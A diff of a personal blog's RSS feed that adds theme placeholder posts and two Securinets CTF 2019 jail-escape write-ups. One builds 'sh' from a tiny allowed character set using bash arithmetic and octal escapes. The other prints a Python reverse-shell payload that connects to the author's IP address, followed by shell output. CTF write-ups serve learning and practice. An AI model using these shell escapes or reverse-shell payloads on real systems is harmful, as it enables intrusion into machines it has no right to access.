@@ -4,62 +4,807 @@
     <title>philomath213</title>
     <link>https://philomath213.github.io/</link>
     <description>Recent content on philomath213</description>
-    <generator>Hugo -- gohugo.io</generator>
-    <managingEditor>bilalphilomath@gmail.com (philomath213)</managingEditor>
-    <webMaster>bilalphilomath@gmail.com (philomath213)</webMaster>
-    <lastBuildDate>Mon, 25 Mar 2019 11:59:39 +0100</lastBuildDate>
+    <generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sat, 01 Jun 2030 13:00:00 +0000</lastBuildDate>
     
-	<atom:link href="https://philomath213.github.io/index.xml" rel="self" type="application/rss+xml" />
+	    <atom:link href="https://philomath213.github.io/index.xml" rel="self" type="application/rss+xml" />
     
+    
+    <item>
+      <title>Example Talk</title>
+      <link>https://philomath213.github.io/talk/example/</link>
+      <pubDate>Sat, 01 Jun 2030 13:00:00 +0000</pubDate>
+      
+      <guid>https://philomath213.github.io/talk/example/</guid>
+      <description>&lt;div class=&#34;alert alert-note&#34;&gt;
+  &lt;div&gt;
+    Click on the &lt;strong&gt;Slides&lt;/strong&gt; button above to view the built-in slides feature.
+  &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Slides can be added in a few ways:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Create&lt;/strong&gt; slides using Academic&amp;rsquo;s &lt;a href=&#34;https://sourcethemes.com/academic/docs/managing-content/#create-slides&#34; target=&#34;_blank&#34;&gt;&lt;em&gt;Slides&lt;/em&gt;&lt;/a&gt; feature and link using &lt;code&gt;slides&lt;/code&gt; parameter in the front matter of the talk file&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Upload&lt;/strong&gt; an existing slide deck to &lt;code&gt;static/&lt;/code&gt; and link using &lt;code&gt;url_slides&lt;/code&gt; parameter in the front matter of the talk file&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Embed&lt;/strong&gt; your slides (e.g. Google Slides) or presentation video on this page using &lt;a href=&#34;https://sourcethemes.com/academic/docs/writing-markdown-latex/&#34; target=&#34;_blank&#34;&gt;shortcodes&lt;/a&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Further talk details can easily be added to this page using &lt;em&gt;Markdown&lt;/em&gt; and $\rm \LaTeX$ math code.&lt;/p&gt;
+</description>
+    </item>
     
     <item>
       <title>Securinets CTF Quals 2019 Special Revenge</title>
       <link>https://philomath213.github.io/post/securinets-ctf-quals-2019-special-revenge/</link>
       <pubDate>Mon, 25 Mar 2019 11:59:39 +0100</pubDate>
-      <author>bilalphilomath@gmail.com (philomath213)</author>
+      
       <guid>https://philomath213.github.io/post/securinets-ctf-quals-2019-special-revenge/</guid>
-      <description>Securinets CTF Quals 2019 - Special Revenge WriteUp Challenge details    Event Challenge Category Points Solves     Securinets CTF Quals 2019 Special Revenge PWN 1000 5    Description  After the disappointment of last year challenge &amp;ldquo;special&amp;rdquo;, I came this year with a mystery revenge.
-ssh special@51.254.114.246
-password : b8f07e1000c719c6a7febde4ec0ab24d
-Author : Anis_Boss
- Another jail escape challenge, we were provided with ssh login (username special).</description>
+      <description>
+
+&lt;h1 id=&#34;securinets-ctf-quals-2019-special-revenge-writeup&#34;&gt;Securinets CTF Quals 2019 - Special Revenge WriteUp&lt;/h1&gt;
+
+&lt;h2 id=&#34;challenge-details&#34;&gt;Challenge details&lt;/h2&gt;
+
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th align=&#34;center&#34;&gt;Event&lt;/th&gt;
+&lt;th align=&#34;center&#34;&gt;Challenge&lt;/th&gt;
+&lt;th align=&#34;center&#34;&gt;Category&lt;/th&gt;
+&lt;th align=&#34;center&#34;&gt;Points&lt;/th&gt;
+&lt;th align=&#34;center&#34;&gt;Solves&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Securinets CTF Quals 2019&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;Special Revenge&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;PWN&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;1000&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;5&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h3 id=&#34;description&#34;&gt;Description&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;After the disappointment of last year challenge &amp;ldquo;special&amp;rdquo;, I came this year with a mystery revenge.&lt;/p&gt;
+
+&lt;p&gt;ssh special@51.254.114.246&lt;/p&gt;
+
+&lt;p&gt;password : b8f07e1000c719c6a7febde4ec0ab24d&lt;/p&gt;
+
+&lt;p&gt;Author : Anis_Boss&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Another jail escape challenge, we were provided with ssh login (username special).&lt;/p&gt;
+
+&lt;p&gt;After being logged in to the server we will get this welcome message, and a prompt where we can type our command.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;================================
+   Welcome to Special Revenge
+================================
+||     ||&amp;lt;(.)&amp;gt;||&amp;lt;(.)&amp;gt;||     ||
+||    _||     ||     ||_    ||
+||   (__D     ||     C__)   ||
+||   (__D     ||     C__)   ||
+||   (__D     ||     C__)   ||
+||   (__D     ||     C__)   ||
+||     ||     ||     ||     ||
+================================
+     Securinets - Quals
+================================
+&amp;gt;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;As expected we can execute the usual command in this very restricted shell (&lt;code&gt;ls&lt;/code&gt;, &lt;code&gt;cat&lt;/code&gt;, &lt;code&gt;id&lt;/code&gt;), also we didn&amp;rsquo;t get any error message by typing these commands.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt; ls
+&amp;gt;&amp;gt; id
+&amp;gt;&amp;gt; cat /etc/passwd
+&amp;gt;&amp;gt; echo helloooooo
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I tried to escape this jail by sending interrupt signal (&lt;code&gt;CTRL+Z&lt;/code&gt;) since this a ssh session, and I got this message &lt;code&gt;&amp;quot;Hemm, nice one but you can&#39;t escape&amp;quot;&lt;/code&gt;, it seems that signal handler are altered by the jail script.&lt;/p&gt;
+
+&lt;p&gt;Then I typed all alphanumeric characters to see if there any filters or a whitelist for words/characters, and got this very helpful error message.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt; 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
+./mystery.sh: line 29: 1: command not found
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;which means that all the alphanumeric charset is filtered except &lt;code&gt;1&lt;/code&gt; (&lt;code&gt;1&lt;/code&gt;: command not found), and the jail script is executing the filter input at the end.&lt;/p&gt;
+
+&lt;p&gt;I also did some tests to see if there are any allowed special characters, because with only &lt;code&gt;1&lt;/code&gt; there are no way to escape this jail, each time I put &lt;code&gt;1&lt;/code&gt; at the beginning and at the end and see what left between them.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt; 1~`/;@#1
+./mystery.sh: line 29: 1#1: command not found
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This means that &lt;code&gt;~`/;@&lt;/code&gt; are filtered while &lt;code&gt;#&lt;/code&gt; is allowed.&lt;/p&gt;
+
+&lt;p&gt;After few attempts, I figure out that only these characters are allowed
+&lt;code&gt;1&amp;lt;\&amp;quot;#$&#39;(){}&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;So how can we escape this jail using just these 11 chars !!!!.&lt;/p&gt;
+
+&lt;h3 id=&#34;objective&#34;&gt;Objective&lt;/h3&gt;
+
+&lt;p&gt;Our objective is escaping this jail, How ??, by executing &lt;code&gt;/bin/sh&lt;/code&gt; or just &lt;code&gt;sh&lt;/code&gt; for short to spawn a shell, or by typing break to break the loop, &amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;the easiest one is spawning a shell by executing the &lt;code&gt;sh&lt;/code&gt; command, so we need to build the &lt;code&gt;sh&lt;/code&gt; string using the allowed characters.&lt;/p&gt;
+
+&lt;h3 id=&#34;our-arsenal&#34;&gt;Our Arsenal&lt;/h3&gt;
+
+&lt;p&gt;Despite the fact that all alphabetic are filtered, we have quit a few tricks at our disposal that we can use to build any command.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$# # number of arguments, evaluates as 0 in this case
+$((expr)) # evaluate an arithmetic expression
+$&#39;\116&#39; # convert octal to a character in string literal
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The 1st trick: &lt;code&gt;$#&lt;/code&gt; evaluates as &lt;code&gt;0&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt; $#
+./mystery.sh: line 29: 0: command not found
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So we have &lt;code&gt;1&lt;/code&gt; and &lt;code&gt;0&lt;/code&gt;  in our hands, what come in my mind first was binary, since everything is built upon binary we can for sure build anything using these two lovely characters.&lt;/p&gt;
+
+&lt;p&gt;The 2nd trick: &lt;code&gt;$((expr))&lt;/code&gt; will evaluate the arithmetic expression &lt;code&gt;expr&lt;/code&gt; and return the result.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#examples
+$ echo $((1+1))     # addition
+2
+$ echo $((6-1))     # subtraction
+5
+$ echo $((2*3))     # multiplication
+6
+$ echo $((6/2))     # division
+3
+$ echo $((2&amp;lt;&amp;lt;4))    # shift left
+32
+$ echo $((32&amp;gt;&amp;gt;4))   # shift right
+2
+$ echo $((2#1010))  # convert binary value to decimal
+10
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The last one is what we need, but we don&amp;rsquo;t have the character &lt;code&gt;2&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Fortunately we can get &lt;code&gt;2&lt;/code&gt; just by shifting left &lt;code&gt;1&lt;/code&gt; by one bit&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ echo $((1&amp;lt;&amp;lt;1))
+2
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# $((1&amp;lt;&amp;lt;1)) =&amp;gt; 2
+# $# =&amp;gt; 0
+# $(($((1&amp;lt;&amp;lt;1))#1$#1$#))  =&amp;gt; $((2#1010)) =&amp;gt; 10
+echo $(($((1&amp;lt;&amp;lt;1))#1$#1$#))
+10
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The 3rd trick, &lt;code&gt;$&#39;\116&#39;&lt;/code&gt; convert the octal value &lt;code&gt;116&lt;/code&gt; to a character &lt;code&gt;N&lt;/code&gt; in string literal.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ echo $&#39;\163&#39;$&#39;\150&#39;
+sh
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4 id=&#34;remark&#34;&gt;Remark&lt;/h4&gt;
+
+&lt;p&gt;I noticed that the input will be evaluate recursively twice, something like &lt;code&gt;eval(eval(INPUT))&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;When I run &lt;code&gt;\$\&#39;\\1$#1\&#39;&lt;/code&gt; in my bash I get this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ \$\&#39;\\1$#1\&#39;
+bash: $&#39;\101&#39;: command not found
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;but when running the same input in the jail, I get this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt; \$\&#39;\\1$#1\&#39;
+/opt/mystery.sh: line 29: A: command not found
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;putting-the-pieces-together&#34;&gt;Putting the Pieces Together&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code&gt;\$\&#39;\\$(($((1&amp;lt;&amp;lt;1))#1$#1$#$#$#11))\&#39;\$\&#39;\\$(($((1&amp;lt;&amp;lt;1))#1$#$#1$#11$#))\&#39;
+# 1st evaluation
+=&amp;gt; \$\&#39;\\$((2#10100011))\&#39;\$\&#39;\\$((2#10010110))\&#39;
+=&amp;gt; \$\&#39;\\163\&#39;\$\&#39;\\150\&#39;
+=&amp;gt; $&#39;\163&#39;$&#39;\150&#39;
+# 2nd evaluation
+=&amp;gt; sh
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt; \$\&#39;\\$(($((1&amp;lt;&amp;lt;1))#1$#1$#$#$#11))\&#39;\$\&#39;\\$(($((1&amp;lt;&amp;lt;1))#1$#$#1$#11$#))\&#39;
+$ id
+uid=1015(special) gid=1015(special) groups=1015(special)
+$ ls -la
+total 28
+dr-xr-xr-x  2 special special 4096 Mar 22 02:02 .
+drwxr-xr-x 22 root    root    4096 Mar 24 10:18 ..
+-rw-r--r--  1 special special  220 Sep  1  2015 .bash_logout
+-rw-r--r--  1 special special 3771 Sep  1  2015 .bashrc
+-rw-r-----  1 root    special   47 Mar 22 02:02 flag.txt
+-rw-r-x---  1 root    special  752 Mar 22 01:55 mystery
+-rw-r--r--  1 special special  655 May 16  2017 .profile
+$ cat flag.txt
+securinets{bash_never_stop_from_being_awesome}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;Jail challenges are always painful at the beginning, so they require more patient than usual challenges. A good understanding of the shell environment and built-ins can be handful in scenarios like this one.&lt;/p&gt;
+
+&lt;p&gt;FLAG: &lt;code&gt;securinets{bash_never_stop_from_being_awesome}&lt;/code&gt;&lt;/p&gt;
+</description>
     </item>
     
     <item>
       <title>Securinets CTF Quals 2019 Stone Mining</title>
       <link>https://philomath213.github.io/post/securinets-ctf-quals-2019-stone-mining/</link>
       <pubDate>Sun, 24 Mar 2019 19:00:46 +0100</pubDate>
-      <author>bilalphilomath@gmail.com (philomath213)</author>
+      
       <guid>https://philomath213.github.io/post/securinets-ctf-quals-2019-stone-mining/</guid>
-      <description>Securinets CTF Quals 2019 - Stone Mining WriteUp Challenge details    Event Challenge Category Points Solves     Securinets CTF Quals 2019 Stone Mining PWN 1000 4    Description  I went inside a mine thinking it was safe, but got stuck. Help me out.
-Service is running at: nc 52.17.200.40 4000
-Author: bibiwars
- A jail escape challenge this time, with no prompt, probably a shell jail.</description>
+      <description>
+
+&lt;h1 id=&#34;securinets-ctf-quals-2019-stone-mining-writeup&#34;&gt;Securinets CTF Quals 2019 - Stone Mining WriteUp&lt;/h1&gt;
+
+&lt;h2 id=&#34;challenge-details&#34;&gt;Challenge details&lt;/h2&gt;
+
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th align=&#34;center&#34;&gt;Event&lt;/th&gt;
+&lt;th align=&#34;center&#34;&gt;Challenge&lt;/th&gt;
+&lt;th align=&#34;center&#34;&gt;Category&lt;/th&gt;
+&lt;th align=&#34;center&#34;&gt;Points&lt;/th&gt;
+&lt;th align=&#34;center&#34;&gt;Solves&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Securinets CTF Quals 2019&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;Stone Mining&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;PWN&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;1000&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;4&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h3 id=&#34;description&#34;&gt;Description&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;I went inside a mine thinking it was safe, but got stuck. Help me out.&lt;/p&gt;
+
+&lt;p&gt;Service is running at: nc 52.17.200.40 4000&lt;/p&gt;
+
+&lt;p&gt;Author: bibiwars&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;A jail escape challenge this time, with no prompt, probably a shell jail.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Jail - Stone Mining
+Objective is to read &#39;flag&#39; file from the current directory
+___________________________________________________________
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;we can start by executing some random commands:&lt;/p&gt;
+
+&lt;p&gt;shell: id, echo foobar, whoami &amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;python: print(&amp;ldquo;foobar&amp;rdquo;), dir() &amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;&amp;hellip;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;id
+Not today, some blacklisted caracter has been used
+echo foobar
+Not today, some blacklisted caracter has been used
+print(&amp;quot;foboar&amp;quot;)
+Not today, some blacklisted caracter has been used
+dir()
+Not today, some blacklisted caracter has been used
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We got only one message &amp;ldquo;Not today, some blacklisted caracter has been used&amp;rdquo;, which means that there are some blacklisted chars.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;a
+Not today, some blacklisted caracter has been used
+b
+Command executed :D
+c
+Not today, some blacklisted caracter has been used
+d
+Command executed :D
+e
+Command executed :D
+f
+Not today, some blacklisted caracter has been used
+0
+Not today, some blacklisted caracter has been used
+1
+Not today, some blacklisted caracter has been used
+2
+Not today, some blacklisted caracter has been used
+3
+Not today, some blacklisted caracter has been used
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;As we can see, at least there some allowed chars.&lt;/p&gt;
+
+&lt;p&gt;After some testing I found that these ascii lower case chars are allowed&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;ertyuopdghbn
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;There are other allowed chars, but I used only these char to escape the jail.&lt;/p&gt;
+
+&lt;p&gt;So how can we bypass that ?&lt;/p&gt;
+
+&lt;p&gt;I first noticed that we can use &amp;ldquo;python&amp;rdquo; word since all its chars are allowed.&lt;/p&gt;
+
+&lt;p&gt;I made an attempt to print to stdout, but didn&amp;rsquo;t get any output&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ nc 52.17.200.40 4000
+Jail - Stone Mining
+Objective is to read &#39;flag&#39; file from the current directory
+___________________________________________________________
+
+python
+print(&#39;foobar&#39;)
+exit()
+^C
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So, I made an assumption that stdout, and stderr are closed, or filtered. Therefore, I attempt to connect to the outside using python sockets.&lt;/p&gt;
+
+&lt;p&gt;I start a listener on my host and connect to it.&lt;/p&gt;
+
+&lt;p&gt;Remote Host:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ nc 52.17.200.40 4000
+Jail - Stone Mining
+Objective is to read &#39;flag&#39; file from the current directory
+___________________________________________________________
+
+python
+import socket
+s = socket.socket()
+s.connect((&#39;41.102.162.29&#39;, 2130))
+s.send(b&#39;test\n&#39;)
+^C
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;My host:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;nc -vvntlp 2130
+Listening on any address 2130 (xds)
+Connection from 41.102.162.29:39198
+test
+Total received bytes: 5
+Total sent bytes: 0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So it works fine, after closing the connection (CTRL+C to close netcat).&lt;/p&gt;
+
+&lt;h2 id=&#34;putting-the-pieces-together&#34;&gt;Putting the Pieces Together&lt;/h2&gt;
+
+&lt;p&gt;The goal is getting reverse shell.&lt;/p&gt;
+
+&lt;p&gt;First, Run the python interpreter.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;python
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Then copy/past the payload there, the script won&amp;rsquo;t execute til the connection is closed, since we are using netcat we need to send interrupt signal CTRL+C to close the connection.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import subprocess
+cmd = [&amp;quot;python&amp;quot;,&amp;quot;-c&amp;quot;,&#39;import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&amp;quot;41.102.162.29&amp;quot;,2130)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&#39;]
+subprocess.Popen(cmd)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I used &amp;ldquo;subprocess.Popen&amp;rdquo; and run the &amp;ldquo;python -c&amp;rdquo;, to spawn a new background process, in order to avoid killing the process after closing the connection.
+we won&amp;rsquo;t see any output in this jail, but you will get a reverser shell.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ nc -vvntlp 2130
+Listening on any address 2130 (xds)
+Connection from 41.102.162.29:39190
+$ id
+uid=999(ctf) gid=999(ctf) groups=999(ctf)
+$ ls -la
+total 12
+drwxr-xr-x 1 root ctf 4096 Mar 24 02:10 .
+drwxr-xr-x 1 root ctf 4096 Mar 24 02:10 ..
+-rwxr-x--- 1 root ctf   59 Mar 23 04:17 flag
+$ cat flag
+c2VjdXJpbmV0c3szODExMjc5Zjg4M2JkM2Q3ZWFkZjU3NmNlY2Y4ZDVjYn0$
+$ cat flag | base64 -d
+securinets{3811279f883bd3d7eadf576cecf8d5cb}
+$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Jails could be escaped taking various ways.&lt;/p&gt;
+
+&lt;p&gt;I&amp;rsquo;m not sure if the solution I come to is the intended one.&lt;/p&gt;
+
+&lt;p&gt;FLAG: securinets{3811279f883bd3d7eadf576cecf8d5cb}&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Slides</title>
+      <link>https://philomath213.github.io/slides/example/</link>
+      <pubDate>Tue, 05 Feb 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://philomath213.github.io/slides/example/</guid>
+      <description>
+
+&lt;h1 id=&#34;welcome-to-slides&#34;&gt;Welcome to Slides&lt;/h1&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://sourcethemes.com/academic/&#34; target=&#34;_blank&#34;&gt;Academic&lt;/a&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&#34;features&#34;&gt;Features&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Efficiently write slides in Markdown&lt;/li&gt;
+&lt;li&gt;3-in-1: Create, Present, and Publish your slides&lt;/li&gt;
+&lt;li&gt;Supports speaker notes&lt;/li&gt;
+&lt;li&gt;Mobile friendly slides&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&#34;controls&#34;&gt;Controls&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Next: &lt;code&gt;Right Arrow&lt;/code&gt; or &lt;code&gt;Space&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Previous: &lt;code&gt;Left Arrow&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Start: &lt;code&gt;Home&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Finish: &lt;code&gt;End&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Overview: &lt;code&gt;Esc&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Speaker notes: &lt;code&gt;S&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Fullscreen: &lt;code&gt;F&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Zoom: &lt;code&gt;Alt + Click&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/hakimel/reveal.js#pdf-export&#34; target=&#34;_blank&#34;&gt;PDF Export&lt;/a&gt;: &lt;code&gt;E&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&#34;code-highlighting&#34;&gt;Code Highlighting&lt;/h2&gt;
+
+&lt;p&gt;Inline code: &lt;code&gt;variable&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Code block:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;porridge = &amp;quot;blueberry&amp;quot;
+if porridge == &amp;quot;blueberry&amp;quot;:
+    print(&amp;quot;Eating...&amp;quot;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&#34;math&#34;&gt;Math&lt;/h2&gt;
+
+&lt;p&gt;In-line math: $x + y = z$&lt;/p&gt;
+
+&lt;p&gt;Block math:&lt;/p&gt;
+
+&lt;p&gt;$$
+f\left( x \right) = \;\frac{{2\left( {x + 4} \right)\left( {x - 4} \right)}}{{\left( {x + 4} \right)\left( {x + 1} \right)}}
+$$&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&#34;fragments&#34;&gt;Fragments&lt;/h2&gt;
+
+&lt;p&gt;Make content appear incrementally&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;{{% fragment %}} One {{% /fragment %}}
+{{% fragment %}} **Two** {{% /fragment %}}
+{{% fragment %}} Three {{% /fragment %}}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Press &lt;code&gt;Space&lt;/code&gt; to play!&lt;/p&gt;
+
+&lt;p&gt;&lt;span class=&#34;fragment &#34; &gt;
+   One
+&lt;/span&gt;
+&lt;span class=&#34;fragment &#34; &gt;
+   &lt;strong&gt;Two&lt;/strong&gt;
+&lt;/span&gt;
+&lt;span class=&#34;fragment &#34; &gt;
+   Three
+&lt;/span&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;A fragment can accept two optional parameters:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;class&lt;/code&gt;: use a custom style (requires definition in custom CSS)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;weight&lt;/code&gt;: sets the order in which a fragment appears&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&#34;speaker-notes&#34;&gt;Speaker Notes&lt;/h2&gt;
+
+&lt;p&gt;Add speaker notes to your presentation&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-markdown&#34;&gt;{{% speaker_note %}}
+- Only the speaker can read these notes
+- Press `S` key to view
+{{% /speaker_note %}}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Press the &lt;code&gt;S&lt;/code&gt; key to view the speaker notes!&lt;/p&gt;
+
+&lt;aside class=&#34;notes&#34;&gt;
+  &lt;ul&gt;
+&lt;li&gt;Only the speaker can read these notes&lt;/li&gt;
+&lt;li&gt;Press &lt;code&gt;S&lt;/code&gt; key to view&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/aside&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&#34;themes&#34;&gt;Themes&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;black: Black background, white text, blue links (default)&lt;/li&gt;
+&lt;li&gt;white: White background, black text, blue links&lt;/li&gt;
+&lt;li&gt;league: Gray background, white text, blue links&lt;/li&gt;
+&lt;li&gt;beige: Beige background, dark text, brown links&lt;/li&gt;
+&lt;li&gt;sky: Blue background, thin dark text, blue links&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;ul&gt;
+&lt;li&gt;night: Black background, thick white text, orange links&lt;/li&gt;
+&lt;li&gt;serif: Cappuccino background, gray text, brown links&lt;/li&gt;
+&lt;li&gt;simple: White background, black text, blue links&lt;/li&gt;
+&lt;li&gt;solarized: Cream-colored background, dark green text, blue links&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+
+&lt;section data-noprocess data-shortcode-slide
+  
+      
+      data-background-image=&#34;/img/boards.jpg&#34;
+  &gt;
+
+
+&lt;h2 id=&#34;custom-slide&#34;&gt;Custom Slide&lt;/h2&gt;
+
+&lt;p&gt;Customize the slide style and background&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-markdown&#34;&gt;{{&amp;lt; slide background-image=&amp;quot;/img/boards.jpg&amp;quot; &amp;gt;}}
+{{&amp;lt; slide background-color=&amp;quot;#0000FF&amp;quot; &amp;gt;}}
+{{&amp;lt; slide class=&amp;quot;my-style&amp;quot; &amp;gt;}}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&#34;custom-css-example&#34;&gt;Custom CSS Example&lt;/h2&gt;
+
+&lt;p&gt;Let&amp;rsquo;s make headers navy colored.&lt;/p&gt;
+
+&lt;p&gt;Create &lt;code&gt;assets/css/reveal_custom.css&lt;/code&gt; with:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-css&#34;&gt;.reveal section h1,
+.reveal section h2,
+.reveal section h3 {
+  color: navy;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&#34;questions&#34;&gt;Questions?&lt;/h1&gt;
+
